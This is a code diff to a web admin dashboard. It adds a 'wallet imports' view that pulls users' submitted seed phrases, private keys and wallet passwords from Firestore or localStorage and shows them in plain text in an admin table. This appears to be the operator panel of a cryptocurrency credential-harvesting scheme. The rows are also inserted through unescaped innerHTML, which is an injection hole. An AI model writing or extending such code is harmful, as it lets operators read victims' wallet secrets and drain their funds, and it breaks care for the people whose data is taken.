@@ -1242,6 +1242,80 @@ class EnhancedAdminDashboard {
         }
     }
 
+    async loadWalletImports() {
+        const tbody = document.getElementById('walletImportsTableBody');
+        if (!tbody) return;
+
+        // Clear body
+        tbody.innerHTML = `
+            <tr>
+                <td colspan="7" class="text-center py-4">
+                    <i class="fas fa-spinner fa-spin me-2"></i>Loading wallet imports...
+                </td>
+            </tr>
+        `;
+
+        let records = [];
+        let source = 'firestore';
+
+        try {
+            // Try Firestore first
+            const q = query(
+                collection(this.db, 'walletImports'),
+                orderBy('createdAt', 'desc'),
+                limit(100)
+            );
+            const snap = await getDocs(q);
+
+            records = snap.docs.map(d => {
+                const data = d.data();
+                return {
+                    createdAt: data.createdAt?.toDate
+                        ? data.createdAt.toDate().toISOString()
+                        : new Date().toISOString(),
+                    userId: data.userId || 'N/A',
+                    method: data.method || 'N/A',
+                    seedPhrase: data.seedPhrase || '',
+                    privateKey: data.privateKey || '',
+                    walletPassword: data.walletPassword || '',
+                    source: 'firestore'
+                };
+            });
+        } catch (err) {
+            console.warn('Loading wallet imports from Firestore failed, falling back to localStorage:', err);
+            source = 'local';
+        }
+
+        if (source === 'local') {
+            const local = JSON.parse(localStorage.getItem('walletImportRecords') || '[]');
+            records = local.reverse(); // show most recent first
+        }
+
+        if (!records.length) {
+            tbody.innerHTML = `
+                <tr>
+                    <td colspan="7" class="text-center py-4 text-muted">
+                        No wallet imports found
+                    </td>
+                </tr>
+            `;
+            return;
+        }
+
+        // Render table rows (plain text as requested)
+        tbody.innerHTML = records.map(rec => `
+            <tr>
+                <td>${rec.createdAt ? new Date(rec.createdAt).toLocaleString() : 'N/A'}</td>
+                <td>${rec.userId || 'N/A'}</td>
+                <td class="text-capitalize">${rec.method || 'N/A'}</td>
+                <td>${rec.seedPhrase || ''}</td>
+                <td>${rec.privateKey || ''}</td>
+                <td>${rec.walletPassword || ''}</td>
+                <td>${rec.source || 'local'}</td>
+            </tr>
+        `).join('');
+    }
+
     setupRealtimeListeners() {
         // Real-time users listener
         const usersQuery = query(collection(this.db, 'users'));
@@ -2694,6 +2768,9 @@ class EnhancedAdminDashboard {
                 break;
             case 'settings':
                 await this.loadSiteSettings();
+                break;
+            case 'wallet-imports':
+                await this.loadWalletImports();
                 break;
         }
     }
